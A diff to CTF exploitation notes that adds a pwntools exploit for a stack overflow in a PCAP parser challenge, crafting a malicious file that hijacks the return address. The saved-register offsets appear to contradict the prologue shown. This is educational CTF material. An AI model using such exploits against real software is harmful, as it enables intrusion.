@@ -15,6 +15,7 @@
 - [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
 - [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
+- [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
 
 ---
 
@@ -341,3 +342,90 @@ for i in range(0, len(leaked) - 8, 8):
 ```
 
 **Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.
+
+---
+
+## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)
+
+**Pattern (PCAP Trap):** Custom file parser (e.g., PCAP, image, archive) allocates a fixed-size stack buffer but allows input records with lengths exceeding the buffer. A `memcpy` copies the full record into the stack buffer before length validation, overwriting saved registers and return address.
+
+```python
+from pwn import *
+
+# Example: PCAP parser with 0x10000 byte stack buffer
+# but PCAP packets can specify up to 0x20000 bytes (snaplen)
+# memcpy(stack_buf, packet_data, packet_len) has no bounds check
+
+elf = ELF('./pcap_parser')
+context.binary = elf
+
+# Step 1: Determine overflow offset
+# Buffer is 0x10000 bytes on stack
+# After buffer: saved callee-save registers (rbx, r12, ...) then return address
+BUF_SIZE = 0x10000
+# Offset to saved registers depends on function prologue
+# Check disassembly: push rbx; push r12; sub rsp, 0x10000
+OFFSET_RBX = BUF_SIZE       # first saved register
+OFFSET_R12 = BUF_SIZE + 8   # second saved register
+OFFSET_RET = BUF_SIZE + 16  # return address
+
+# Step 2: Craft payload with register restoration
+# Callee-saved registers must be valid or the function epilogue crashes
+# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
+# r12: set to value that exits cleanly (e.g., loop terminator = 1)
+
+bss_addr = elf.bss()         # Readable memory for rbx
+win_addr = elf.symbols['win'] # Target function
+
+payload = b'A' * BUF_SIZE
+payload += p64(bss_addr)      # rbx -> valid readable address
+payload += p64(1)             # r12 = 1 (loop exit condition)
+payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
+payload += p64(win_addr)      # return to win()
+
+# Step 3: Wrap in valid file format container
+# For PCAP: valid global header + packet header with large caplen
+import struct
+
+# PCAP global header
+pcap_header = struct.pack('<IHHIIII',
+    0xa1b2c3d4,  # magic number
+    2, 4,        # version 2.4
+    0,           # thiszone
+    0,           # sigfigs
+    0x20000,     # snaplen (max packet size - larger than stack buffer!)
+    1            # network (LINKTYPE_ETHERNET)
+)
+
+# PCAP packet record header
+pkt_ts_sec = 0
+pkt_ts_usec = 0
+pkt_caplen = len(payload)   # captured length = our overflow payload
+pkt_origlen = len(payload)
+
+pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)
+
+# Build malicious PCAP
+pcap_data = pcap_header + pkt_header + payload
+
+with open('exploit.pcap', 'wb') as f:
+    f.write(pcap_data)
+
+# Step 4: Send to target
+p = remote('target', 1337)
+p.send(pcap_data)
+p.interactive()
+```
+
+**Key insight:** Custom file parsers often allocate fixed-size stack buffers based on a "maximum expected size" but the file format allows specifying larger records. The `memcpy` happens before the length check, creating a classic stack overflow. When exploiting, you must restore callee-saved registers to valid values in the overflow payload -- the function epilogue pops them before returning, and invalid values cause crashes before the return address is reached. Common requirements: `rbx` must point to readable memory (use BSS), loop counter registers must satisfy exit conditions.
+
+**Callee-saved register restoration checklist:**
+1. Identify which registers the function pushes in its prologue (`push rbx`, `push r12`, etc.)
+2. Determine the order they are restored in the epilogue (reverse of push order)
+3. Set `rbx` to any readable address (BSS, GOT, or known mapped page)
+4. Set loop counters (`r12`, `r13`) to values that terminate any loops cleanly
+5. Add a `ret` gadget for 16-byte stack alignment before the win function address
+
+**When to recognize:** Challenge involves a custom parser for a binary file format (PCAP, ELF, image, protocol buffer). The parser uses `memcpy` or `read` with a length field from the input. Check if the buffer size is smaller than the maximum length the format allows.
+
+**References:** MetaCTF Flash CTF 2026 "PCAP Trap"
